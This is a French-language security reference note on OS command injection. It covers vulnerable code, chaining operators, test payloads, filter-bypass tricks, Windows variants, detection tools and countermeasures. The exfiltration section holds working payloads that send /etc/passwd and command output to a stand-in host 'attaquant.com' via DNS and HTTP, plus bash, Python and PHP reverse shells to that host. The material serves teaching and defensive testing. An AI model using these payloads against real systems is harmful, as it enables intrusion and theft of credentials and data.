---
title: Command Injection
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [command-injection, rce, os, shell, web, sécurité]
date: 2026-03-22
---

# Command Injection

L'injection de commandes OS (Command Injection) permet à un attaquant d'exécuter des commandes système arbitraires sur le serveur hôte en injectant des métacaractères shell dans des paramètres traités par des fonctions d'exécution de commandes.

## Principe

```python
# Code vulnérable — Python
import subprocess
host = request.args.get('host')
output = subprocess.check_output(f"ping -c 1 {host}", shell=True)

# Injection :
# host = "8.8.8.8; id"
# → ping -c 1 8.8.8.8; id
# → Exécute ping PUIS id
```

```php
// Code vulnérable — PHP
$filename = $_GET['file'];
system("convert " . $filename . " output.jpg");

// Injection :
// file = "image.png; cat /etc/passwd"
// → convert image.png; cat /etc/passwd output.jpg
```

## Opérateurs de chaînage

```bash
# ; — exécuter les deux commandes (indépendamment du succès)
ping -c 1 8.8.8.8; id

# && — exécuter la seconde si la première réussit
ping -c 1 8.8.8.8 && id

# || — exécuter la seconde si la première échoue
ping -c 1 INVALIDE || id

# | — pipe, sortie de la première = entrée de la seconde
echo test | id

# ` ` — backtick, substitution de commande
echo `id`

# $() — substitution de commande (plus portable)
echo $(id)

# & — exécuter en arrière-plan
sleep 10 & id   # id s'exécute immédiatement

# \n — nouvelle ligne (contourne certains filtres)
ping%0aid       # %0a = \n en URL
```

## Payloads de test

```bash
# Tests de base
; id
| id
&& id
`id`
$(id)
; whoami
; cat /etc/passwd

# Blind command injection (pas de sortie visible)
; sleep 5             # Délai → confirme l'exécution
| sleep 5
&& sleep 5
$(sleep 5)

# Out-of-band (via DNS ou HTTP)
; nslookup `id`.attaquant.com
; curl http://attaquant.com/$(id)
; wget http://attaquant.com/?output=$(id|base64)

# Via ping (time-based)
; ping -c 5 127.0.0.1   # 5 pings = ~5 secondes → délai mesurable
```

## Bypass de filtres

```bash
# Filtre sur les espaces → utiliser des alternatives
cat${IFS}/etc/passwd          # ${IFS} = séparateur interne bash (espace par défaut)
cat$IFS/etc/passwd
cat</etc/passwd               # Redirection comme séparateur
{cat,/etc/passwd}             # Expansion d'accolade bash

# Filtre sur / → encoder ou utiliser des variables
${PATH:0:1}                   # = / (premier char de $PATH = /)
cat${PATH:0:1}etc${PATH:0:1}passwd

# Filtre sur les mots-clés (cat, id, etc.)
c'a't /etc/passwd             # Guillemets dans la commande → bash les ignore
ca\t /etc/passwd              # Backslash d'échappement
"cat" /etc/passwd

# Filtre sur les backticks et $()
# Utiliser d'autres méthodes de substitution si disponibles

# Encodage URL (si le filtre est avant le décodage)
%3B%20id                      # ; id encodé

# Via les variables d'environnement
a=id; $a
a=i; b=d; $a$b

# Caractère nul (termine la commande en C, ignoré en bash)
ping 8.8.8.8%00; id           # Rare mais testé

# Newline dans un paramètre POST (parfois non filtré)
POST body: ip=8.8.8.8%0aid
```

## Blind Command Injection — exfiltration

```bash
# DNS out-of-band (le plus fiable — DNS rarement bloqué en sortie)
; nslookup $(cat /etc/passwd | base64 | tr -d '\n').attaquant.com
; dig $(whoami).attaquant.com

# HTTP out-of-band
; curl "http://attaquant.com/?$(cat /etc/passwd | base64 | tr -d '\n')"
; wget -q -O- "http://attaquant.com/collect?data=$(id|base64)"

# Via Burp Collaborator (OAST)
; nslookup xyz.oastify.com

# Écriture de fichier (si le répertoire web est accessible en écriture)
; id > /var/www/html/output.txt
# Puis : curl https://target.com/output.txt

# Reverse shell
; bash -i >& /dev/tcp/attaquant.com/4444 0>&1
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attaquant.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
; php -r '$sock=fsockopen("attaquant.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Contextes spécifiques

### Windows Command Injection

```cmd
:: Opérateurs Windows
& ping 127.0.0.1 & whoami
| whoami
&& whoami

:: Substitution de commande (pas de backtick en cmd)
for /f "tokens=*" %i in ('whoami') do echo %i

:: PowerShell
; powershell -command "Get-Process"
$(Invoke-Expression("whoami"))
```

### Via arguments de fonctions

```python
# Python — même si subprocess est appelé sans shell=True
# et avec une liste d'arguments, les arguments eux-mêmes peuvent être injectés
# si passés à des outils qui les ré-interprètent

# Injection via nom de fichier
filename = "image.png; rm -rf /"
# Si passé à ImageMagick, ffmpeg, ou d'autres outils
os.system(f"convert '{filename}' output.jpg")
# Même les guillemets ne protègent pas si filename contient '
```

### Injection via Git / SVN hooks

```bash
# Si une application exécute git clone avec une URL utilisateur
git clone "https://attaquant.com/repo.git$(id)"
# Certaines implémentations exécutent des scripts avec l'URL directement
```

## Détection

```bash
# Test manuel — fuzzing avec Burp Intruder
# Payload list : ; sleep 5 | sleep 5 && sleep 5 `sleep 5` $(sleep 5)
# Observer la durée de réponse → augmentation de 5s = injection time-based

# Outils automatisés
# commix — détecteur d'injection de commandes
pip install commix
commix --url "https://target.com/ping?host=INJECT_HERE"
commix --url "https://target.com/process" --data "cmd=INJECT_HERE"

# Burp Scanner (Pro) — détecte les command injections
```

## Contre-mesures

```python
# Python — utiliser subprocess sans shell=True + liste d'arguments
import subprocess, shlex

# Dangereux
host = request.args.get('host')
subprocess.check_output(f"ping -c 1 {host}", shell=True)

# Sûr — liste d'arguments, pas d'interprétation shell
host = request.args.get('host')
# Valider d'abord
import re
if not re.match(r'^[0-9]{1,3}(\.[0-9]{1,3}){3}$', host):
    abort(400)
result = subprocess.run(["ping", "-c", "1", host], capture_output=True, timeout=5)

# PHP — éviter system(), exec(), shell_exec(), passthru(), popen()
# Utiliser escapeshellarg() si incontournable
$host = escapeshellarg($_GET['host']);
system("ping -c 1 " . $host);
# escapeshellarg() entoure l'argument de guillemets simples et échappe les '

# Méthode préférée : utiliser des bibliothèques natives (pas de shell)
# Au lieu de ping via shell → utiliser une bibliothèque de ping native
# Au lieu de convert via ImageMagick CLI → utiliser l'API PHP d'ImageMagick (Imagick)
```

```
Checklist défensive :
✓ Ne jamais passer des entrées utilisateur à des fonctions d'exécution de commandes
✓ Si inévitable : valider via whitelist stricte (IP, nom de fichier)
✓ Utiliser subprocess sans shell=True (liste d'arguments)
✓ escapeshellarg() / escapeshellcmd() en PHP si vraiment nécessaire
✓ Exécuter avec un utilisateur à faibles privilèges (pas root/www-data avec sudo)
✓ Chroot / namespaces pour limiter les dommages en cas d'exploitation
✓ WAF pour bloquer les métacaractères courants (;|&`$() dans les paramètres)
```
